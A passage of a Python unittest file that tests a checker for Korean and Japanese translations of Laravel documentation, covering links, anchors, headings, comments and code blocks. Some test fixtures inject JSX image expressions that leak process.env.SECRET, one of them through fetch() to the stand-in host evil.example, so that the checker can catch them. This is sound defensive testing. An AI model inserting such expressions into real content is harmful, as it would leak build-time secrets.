            "<!-- Keep this text. -->\n"
            "번역문입니다.\n"
            "```\n"
            "malformed <div> and {{version}}\n"
        )

        self.assertIn(
            "code block mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_fenced_code_blocks_with_equivalent_trailing_newline(self):
        source = """```php
echo 'ok';
```
"""
        translated = """```php
echo 'ok';
```"""

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_accepts_fenced_code_blocks_with_equivalent_trailing_spaces(self):
        source = "```php\nreturn true;    \n```\n"
        translated = "```php\nreturn true;\n```\n"

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_accepts_long_fenced_code_blocks_with_inner_shorter_fence(self):
        source = "````markdown\n```php\necho 'ok';\n```\n````\n"
        translated = source

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_quoted_fenced_code_content_changed(self):
        source = "> ```text\n> literal\n> ```\n"
        translated = "> ```text\n> translated\n> ```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_does_not_close_fence_at_different_blockquote_depth(self):
        source = "```text\n> ```\nliteral\n```\n"
        translated = "```text\n> ```\ntranslated\n```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_html_anchor_name_changed(self):
        source = '<a name="basic-routing"></a>\n\n# Routing\n'
        translated = """<!-- <a name="basic-routing"></a> -->
<a name="기본-라우팅"></a>

<!-- # Routing -->
# 라우팅 (Routing)
"""

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_does_not_treat_data_name_as_anchor_name(self):
        source = '<a name="basic-routing"></a>\n'
        translated = '<a data-name="basic-routing"></a>\n'

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_html_image_source_changed(self):
        source = '<img src="/img/original.png" alt="Original"/>\n'
        translated = '<img src="/img/changed.png" alt="번역"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_treat_data_src_as_image_src(self):
        source = '<img src="/img/original.png"/>\n'
        translated = '<img data-src="/img/original.png"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_ignores_translation_alias_anchors(self):
        source = '<a name="generating-migrations"></a>\n\n# Migrations\n'
        translated = """<!-- <a name="generating-migrations"></a> -->
<a name="generating-migrations"></a>
<a name="writing-migrations" data-translation-alias="true"></a>

<!-- # Migrations -->
# 마이그레이션 (Migrations)
"""

        self.assertNotIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_missing_original_english_comment_for_heading_or_paragraph(self):
        source = "# Installation\n\nInstall Laravel with Composer.\n"
        translated = "# 설치 (Installation)\n\nComposer로 Laravel을 설치합니다.\n"

        self.assertIn("missing original comment", verify.verify(translated, source=source))
        self.assertEqual(
            verify.missing_original_comments(translated, source),
            ["# Installation", "Install Laravel with Composer."],
        )

    def test_accepts_escaped_js_comment_closer_inside_original_comment(self):
        source = "Use `DB::raw(/* ... */)` carefully."
        translated = """<!-- Use `DB::raw(/* ... *&#47;)` carefully. -->
`DB::raw(/* ... */)`를 신중하게 사용합니다.
"""

        self.assertNotIn("missing original comment", verify.verify(translated, source=source))

    def test_does_not_require_comments_for_standalone_html_tags(self):
        source = '<div class="grid">\n\nBody.\n\n</div>\n'
        translated = (
            '<div class="grid">\n\n'
            "<!-- Body. -->\n본문입니다.\n\n"
            "</div>\n"
        )

        self.assertNotIn(
            "missing original comment",
            verify.verify(translated, source=source),
        )

    def test_detects_missing_standalone_html_wrappers(self):
        source = '<div class="content-list" markdown="1">\n\nBody.\n\n</div>\n'
        translated = "<!-- Body. -->\n본문입니다.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_accepts_blankless_html_wrappers_with_body_comment(self):
        source = '<div class="content-list">\nBody.\n</div>\n'
        translated = (
            '<div class="content-list">\n'
            "<!-- Body. -->\n본문입니다.\n"
            "</div>\n"
        )

        issues = verify.verify(translated, source=source)

        self.assertNotIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_detects_missing_multi_tag_structural_fragment(self):
        source = '<p><img src="/img/example.png"/></p>\n'

        self.assertIn("html tag mismatch", verify.verify("", source=source))

    def test_detects_missing_inline_table_tags(self):
        source = "<tr><td>Command</td></tr>\n"
        translated = "<!-- <tr><td>Command</td></tr> -->\n명령\n"

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_checks_inline_tags_beside_named_anchor(self):
        source = '<a name="example"></a><img src="/img/example.png"/>\n'
        translated = '<a name="example"></a>\n'

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_normalizes_known_stale_link_targets_before_comparing(self):
        source = "See [Agents](#agents-integration)."
        translated = """<!-- See [Agents](#agents-integration). -->
[Agents](#agent-integration)를 참고하세요.
"""

        self.assertNotIn("link target mismatch", verify.verify(translated, source=source))

    def test_normalizes_controller_stale_target_only_after_v9(self):
        target = "#actions-handled-by-resource-controller"

        self.assertEqual(
            verify._normalize_link_target(target, version="9.x"),
            target,
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="10.x"),
            "#actions-handled-by-resource-controllers",
        )

    def test_normalizes_agents_target_only_in_v12_and_master(self):
        target = "#agents-integration"

        self.assertEqual(
            verify._normalize_link_target(target, version="12.x"),
            "#agent-integration",
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="13.x"),
            target,
        )

    def test_normalizes_versioned_absolute_doc_links_to_relative_targets(self):
        source = "See [Cache](cache)."
        translated = """<!-- See [Cache](cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="12.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_preserves_distinct_link_target_route_classes(self):
        cases = (
            ("/docs/13.x/cache", "/cache"),
            ("/docs/13.x/#intro", "#intro"),
            ("/docs/13.x/?view=all", "?view=all"),
            ("/docs/13.x//cache", "cache"),
            ("./https://example.com", "https://example.com"),
            ("./mailto:user@example.com", "mailto:user@example.com"),
        )

        for source_target, translated_target in cases:
            with self.subTest(
                source_target=source_target,
                translated_target=translated_target,
            ):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertIn("link target mismatch", issues)
                self.assertIn("link pair mismatch", issues)

    def test_normalizes_only_valid_current_version_document_paths(self):
        cases = (
            ("cache?view=all#intro", "/docs/13.x/cache?view=all#intro"),
            (
                "cache?view=all#intro",
                "https://laravel.com/docs/13.x/cache?view=all#intro",
            ),
            ("cache", "./cache"),
        )

        for source_target, translated_target in cases:
            with self.subTest(translated_target=translated_target):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_detects_internal_doc_link_version_drift(self):
        source = "See [Cache](/docs/13.x/cache)."
        translated = """<!-- See [Cache](/docs/13.x/cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_laravel_absolute_doc_link_version_drift(self):
        source = "See [Cache](https://laravel.com/docs/13.x/cache)."
        translated = """<!-- See [Cache](https://laravel.com/docs/13.x/cache). -->
[Cache](https://laravel.com/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_normalizes_laravel_absolute_doc_links_to_relative_targets(self):
        source = "See [Cache](cache)."
        for version in ("12.x", "master"):
            with self.subTest(version=version):
                translated = (
                    "<!-- See [Cache](cache). -->\n"
                    f"[Cache](https://laravel.com/docs/{version}/cache)를 참고하세요.\n"
                )

                issues = verify.verify(translated, source=source, version=version)

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_keeps_nonversioned_laravel_doc_urls_external(self):
        source = "See [Sanctum](sanctum)."
        translated = """<!-- See [Sanctum](sanctum). -->
[Sanctum](https://laravel.com/docs/sanctum)를 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_ignores_legacy_excluded_links_consistently(self):
        for target in (
            "#assert-similar-json",
            "#formatting-shortcode-notifications",
        ):
            with self.subTest(target=target):
                source = f"See [Legacy section]({target})."
                translated = f"<!-- {source} -->\n이전 섹션을 참고하세요.\n"

                issues = verify.verify(translated, source=source)

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link label mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_does_not_ignore_unknown_missing_anchor_links(self):
        source = "See [Unknown section](#unknown-section)."
        translated = f"<!-- {source} -->\n알 수 없는 섹션을 참고하세요.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_heading_level_mismatch(self):
        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# 제목 (Title)

<!-- ## Install -->
### 설치 (Install)
"""

        self.assertIn("heading mismatch", verify.verify(translated, source=source))

    def test_detects_translated_heading_text(self):
        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# Title

<!-- ## Install -->
## 설치 (Install)
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_removed_explicit_heading_id(self):
        source = "# Stable {#stable-anchor}\n"
        translated = """<!-- # Stable {#stable-anchor} -->
# Stable
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_translated_front_matter_title(self):
        source = "---\ntitle: Installation\n---\n\n# Installation\n"
        translated = "---\ntitle: 설치\n---\n\n<!-- # Installation -->\n# Installation\n"

        self.assertIn(
            "front matter title mismatch", verify.verify(translated, source=source)
        )

    def test_does_not_treat_later_horizontal_rule_as_front_matter(self):
        source = "Intro.\n\n---\n\nDetails.\n"
        translated = """<!-- Intro. -->
소개입니다.

---

상세입니다.
"""

        self.assertIn("missing original comment", verify.verify(translated, source=source))

    def test_detects_admonition_body_outside_blockquote(self):
        translated = """> [!NOTE]
<!-- Note body. -->
본문입니다.
"""

        self.assertIn("admonition body outside blockquote", verify.verify(translated))

    def test_detects_duplicated_admonition_marker(self):
        translated = """> [!NOTE]
> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertIn("duplicate admonition marker", verify.verify(translated))

    def test_accepts_single_admonition_marker(self):
        translated = """> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertNotIn("duplicate admonition marker", verify.verify(translated))

    def test_rejects_changed_final_admonition_type(self):
        source = "> [!CAUTION]\n> Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_same_final_admonition_type_from_inline_source_marker(self):
        source = "> [!NOTE] Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertNotIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_final_admonition_type_in_markdown_containers(self):
        cases = (
            (
                "- > [!WARNING] Protect credentials.\n",
                "- > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "1. > [!WARNING] Protect credentials.\n",
                "1. > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                ">> [!WARNING] Protect credentials.\n",
                ">> [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]Protect credentials.\n",
                "> [!NOTE]자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]\n> Protect credentials.\n",
                "> [!warning]\n> 자격 증명을 보호합니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "admonition type mismatch",
                    verify.verify(translated, source=source),
                )

    def test_ignores_single_comment_opener_inside_inline_code(self):
        source = "Use `<!--` literally.\n"
        translated = (
            "<!-- Use `<!--` literally. -->\n"
            "`<!--`를 그대로 사용합니다.\n"
        )

        self.assertNotIn(
            "malformed HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_legacy_note_colon_inside_bold_text(self):
        self.assertIn(
            "legacy note marker",
            verify.verify("> **Note:** Keep this.\n"),
        )
        for marker in (
            "> **참고:** 본문입니다.\n",
            "> **注意:** 本文です。\n",
            "> **注:** 本文です。\n",
        ):
            with self.subTest(marker=marker):
                self.assertIn("legacy note marker", verify.verify(marker))

    def test_handles_greater_than_in_img_attribute_when_checking_self_close(self):
        self.assertNotIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0"/>\n'),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0">\n'),
        )

    def test_handles_greater_than_in_img_jsx_expression(self):
        self.assertNotIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0} />\n"),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0}>\n"),
        )

    def test_rejects_changed_html_image_display_expression(self):
        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + process.env.SECRET + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_html_image_display_text_with_same_expression(self):
        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + labels.safe + " 状態"} />\n'
        )

        self.assertNotIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_non_image_display_attribute(self):
        source = '<Widget aria-label={"Cache lock"} />\n'
        translated = (
            '<!-- <Widget aria-label={"Cache lock"} /> -->\n'
            '<Widget aria-label={"캐시 잠금"} />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_changed_non_image_display_expression(self):
        source = (
            '<Widget aria-label={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<!-- <Widget aria-label={"Cache " + labels.safe + " status"} /> -->\n'
            '<Widget aria-label={"캐시 " + process.env.SECRET + " 상태"} />\n'
        )

        self.assertIn(
            "html display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_string_argument_in_image_display_expression(self):
        source = (
            '<img src="/a.png" '
            'alt={getLabel("safe") + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={getLabel("secret") + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_image_expression_containing_regex_literal(self):
        source = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test(label) ? "safe" : "other"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test((fetch("https://evil.example/" '
            '+ process.env.SECRET), label)) ? "safe" : "other"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_image_expression_hidden_between_js_comments(self):
        source = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (void 0) + /* " + */ + " visible"} />\n'
        )
        translated = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (globalThis.pwned = process.env.SECRET) '
            '+ /* " + */ + " 表示"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_quote_text_inside_image_regex_literal(self):
        source = '<img src="/a.png" alt={/a+\'SAFE\'+b/.source} />\n'
        translated = '<img src="/a.png" alt={/a+\'EVIL\'+b/.source} />\n'

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_list_markers_dropped_in_translation(self):
        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
[Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。

[Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertIn("list marker mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_list_markers(self):
        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
- [Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。
- [Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertNotIn("list marker mismatch", verify.verify(translated, source=source))

    def test_accepts_translation_that_expands_prose_into_a_list(self):
        source = "Supported serializers include: `A`, `B`, and `C`.\n"
        translated = """<!-- Supported serializers include: `A`, `B`, and `C`. -->
지원되는 직렬화 방식:

- `A`
- `B`
- `C`
"""

        self.assertNotIn("list marker mismatch", verify.verify(translated, source=source))


class VerifyProviderResponseTests(unittest.TestCase):
    def test_rejects_indented_generated_comment(self):
        source = "Acquire the lock.\n"
        translated = """    <!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_inline_generated_annotation(self):
        source = "First source line.  \nSecond source line.\n"
        translated = (
            "원문에 없는 추가 설명입니다. "
            "<!-- First source line. Second source line. -->  \n"
            "정상 번역입니다.\n"
        )

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_extra_empty_comment(self):
        source = "Acquire the lock.\n"
        translated = """<!-- -->
<!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_preserved_empty_source_comment(self):
        source = """<!-- -->

Acquire the lock.
"""
        translated = """<!-- -->

<!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_inline_source_comment_moved_outside_its_paragraph(self):
        source = "Before <!-- keep --> after.\n"
        translated = """<!-- Before <!-- keep --&gt; after. -->
이전과 이후입니다.
<!-- keep -->
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_inline_source_comment_moved_to_another_hard_break_line(self):
        source = "Before <!-- keep --> after.  \nSecond source line.\n"
        translated = (
            "<!-- Before <!-- keep --&gt; after. Second source line. -->\n"
            "첫 번째 번역 줄입니다." + "  \n"
            "두 번째 <!-- keep --> 번역 줄입니다.\n"
        )

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_source_comment_removed_from_blockquote(self):
        source = """> <!-- keep -->
> Guidance.
"""
        translated = """<!-- keep -->
> 안내입니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_malformed_html_comment_delimiters(self):
        source = "Acquire the lock.\n"
        variants = (
            "<!-- Acquire the lock. -->\n캐시 잠금을 획득합니다. <!--\n",
            "<!-- Acquire the lock. -->\n캐시 잠금을 획득합니다. -->\n",
            (
                "<!-- Acquire the lock. -->\n"
                "캐시 잠금을 획득합니다. <!-- outer <!-- inner -->\n"
            ),
        )

        for translated in variants:
            with self.subTest(translated=translated):
                self.assertIn(
                    "provider malformed HTML comment",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_ignores_comment_delimiters_inside_fenced_code(self):
        source = """```text
<!--
-->
```
"""

        self.assertNotIn(
            "provider malformed HTML comment",
            response_contract.verify(source, source),
        )

    def test_ignores_comment_delimiters_inside_inline_code(self):
        cases = (
            (
                "Use `<!--` literally.\n",
                "<!-- Use `<!--` literally. -->\n"
                "`<!--`를 그대로 사용합니다.\n",
            ),
            (
                "Use `<!--` and `-->` as literal delimiters.\n",
                "<!-- Use `<!--` and `--&gt;` as literal delimiters. -->\n"
                "`<!--`와 `-->`를 리터럴 구분자로 사용합니다.\n",
            ),
        )
        for source, translated in cases:
            with self.subTest(source=source):
                self.assertNotIn(
                    "provider malformed HTML comment",
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_accepts_adjacent_legacy_structural_annotations(self):
        cases = (
            ("<div>\n", "<!-- <div> -->\n<div>\n"),
            (
                "- [Guide](#guide)\n",
                "<!-- - [Guide](#guide) -->\n- [Guide](#guide)\n",
            ),
            (
                '<a name="guide"></a>\n',
                '<!-- <a name="guide"></a> -->\n<a name="guide"></a>\n',
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )

    def test_rejects_relocated_legacy_structural_annotations(self):
        cases = (
            ("<div>\n", "<div>\n<!-- <div> -->\n"),
            (
                "- [Guide](#guide)\n",
                "- [Guide](#guide)\n<!-- - [Guide](#guide) -->\n",
            ),
            (
                '<a name="guide"></a>\n',
                '<a name="guide"></a>\n<!-- <a name="guide"></a> -->\n',
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "provider source comment mismatch",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_accepts_owned_optional_quote_annotation(self):
        source = "> Quoted guidance.\n"
        translated = """> <!-- Quoted guidance. -->
> 인용 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_optional_quote_after_blockquoted_fence(self):
        source = (
            "> ```text\n"
            "> literal\n"
            "> ```\n\n"
            "> Quoted guidance.\n"
        )
        translated = (
            "> ```text\n"
            "> literal\n"
            "> ```\n\n"
            "> <!-- Quoted guidance. -->\n"
            "> 인용 안내입니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_optional_quote_after_source_authored_quote_comment(self):
        source = """> <!-- keep -->
> Guidance.
"""
        translated = """> <!-- keep -->
> <!-- Guidance. -->
> 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_moved_optional_quote_after_source_authored_comment(self):
        source = """> <!-- keep -->
> First guidance.

> Second guidance.
"""
        translated = """> <!-- keep -->
> 첫 번째 안내입니다.

> <!-- First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider original comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_orphaned_optional_quote_annotation(self):
        source = "> Quoted guidance.\n"
        translated = """> 인용 안내입니다.
> <!-- Quoted guidance. -->
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_optional_quote_annotation_at_wrong_depth(self):
        source = "> Quoted guidance.\n"
        translated = """> > <!-- Quoted guidance. -->
> 인용 안내입니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_optional_quote_annotation_on_a_later_quote(self):
        source = """> First guidance.

> Second guidance.
"""
        translated = """> 첫 번째 안내입니다.

> <!-- First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider original comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_moved_structural_quote_annotation(self):
        source = """> First guidance.
> Second guidance.
"""
        translated = """> 첫 번째 안내입니다.
<!-- > First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_paragraph_annotation_matching_optional_quote_body(self):
        source = """> Same guidance.

Same guidance.
"""
        translated = """> 같은 인용 안내입니다.

<!-- Same guidance. -->
같은 문단 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_paragraph_annotation_matching_later_source_comment(self):
        source = """Same guidance.

<!-- Same guidance. -->
"""
        translated = """<!-- Same guidance. -->
같은 문단 안내입니다.

<!-- Same guidance. -->
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_preserved_multiline_source_comment(self):
        source = """<!--
keep line 1
keep line 2
-->

Acquire the cache lock.
"""
        translated = """<!--
keep line 1
keep line 2
-->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_collapsed_multiline_source_comment(self):
        source = """<!--
keep directive
-->

Acquire the cache lock.
"""
        translated = """<!-- keep directive -->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_final_verifier_distinguishes_source_comment_from_annotation(self):
        source = """<!-- Same. -->

Same.
"""
        translated = """<!-- Same. -->
동일합니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_final_verifier_rejects_relocated_source_comment(self):
        source = """<!-- keep -->

First paragraph.

Second paragraph.
"""
        translated = """<!-- First paragraph. -->
첫 번째 문단입니다.

<!-- keep -->

<!-- Second paragraph. -->
두 번째 문단입니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_ordered_translated_blocks(self):
        source = "# Cache\n\nAcquire the lock. Release it afterwards.\n"
        translated = """<!-- # Cache -->
# Cache

<!-- Acquire the lock. Release it afterwards. -->
잠금을 획득합니다. 이후 잠금을 해제합니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_unannotated_translated_quote_body(self):
        source = (
            "> Vector search requires the AI SDK and PostgreSQL or MongoDB.\n"
        )
        translated = (
            "> 벡터 검색에는 AI SDK와 PostgreSQL 또는 MongoDB가 필요합니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_empty_quote_body_after_source_annotation(self):
        source = "> Quoted guidance.\n"
        translated = "> <!-- Quoted guidance. -->\n>\n"

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_unrelated_comment_inside_quote(self):
        source = "> Expected quote guidance.\n"
        translated = """> <!-- injected -->
> 예상한 인용문 안내입니다.
"""

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider original comment mismatch", issues)
        self.assertIn("provider annotation ownership mismatch", issues)

    def test_accepts_preserved_product_name_with_translated_suffix(self):
        source = "Laravel Vapor\n"
        translated = "<!-- Laravel Vapor -->\nLaravel Vapor를 사용합니다.\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_title_case_action_phrase_with_translated_suffix(self):
        cases = (
            ("Delete All Records", "Delete All Records를 실행합니다."),
            ("Acquire Lock", "Acquire Lock을 사용합니다."),
        )
        for source_body, translated_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{translated_body}\n"
                )

                self.assertIn(
                    "provider untranslated source text",
                    response_contract.verify(
                        translated,
                        source_body + "\n",
                        locale="ko",
                    ),
                )

    def test_rejects_prose_phrases_with_technical_prefixes(self):
        cases = (
            ("This Works", "This Works예요."),
            ("This Works.", "This Works예요."),
            ("API Requests Are Retried", "API Requests Are Retried를 사용합니다."),
            ("HTTP Requests Are Retried", "HTTP Requests Are Retried를 사용합니다."),
            ("Laravel Users Are Active", "Laravel Users Are Active를 사용합니다."),
            ("API Delete All Records", "API Delete All Records를 사용합니다."),
        )
        for source_body, translated_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{translated_body}\n"
                )

                self.assertIn(
                    "provider untranslated source text",
                    response_contract.verify(
                        translated,
                        source_body + "\n",
                        locale="ko",
                    ),
                )

    def test_rejects_all_caps_prose_echoes(self):
        cases = (
            "API ERROR HANDLING AND RETRY GUIDE",
            "HTTP JSON API SQL PHP",
            "API Delete All Records",
        )
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}\n"
                )

                self.assertIn(
                    "provider untranslated source text",
                    response_contract.verify(
                        translated,
                        source_body + "\n",
                        locale="ko",
                    ),
                )

    def test_rejects_untranslated_prose_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            f"{source}"
        )

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_translated_prose_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
